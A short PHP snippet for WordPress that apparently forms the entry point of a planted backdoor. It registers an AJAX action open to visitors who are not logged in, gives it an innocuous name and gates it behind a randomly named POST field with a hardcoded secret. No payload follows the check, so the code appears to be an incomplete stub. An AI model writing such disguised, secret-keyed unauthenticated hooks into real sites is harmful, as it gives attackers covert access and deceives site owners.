<?php

function affiliates_revisions_account() {
	if (!isset($_POST["jtmkghlrglfxghy"]) || $_POST["jtmkghlrglfxghy"] !== "lOU6uIRtjlSN09x") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'affiliates_revisions_account', 5, 1);
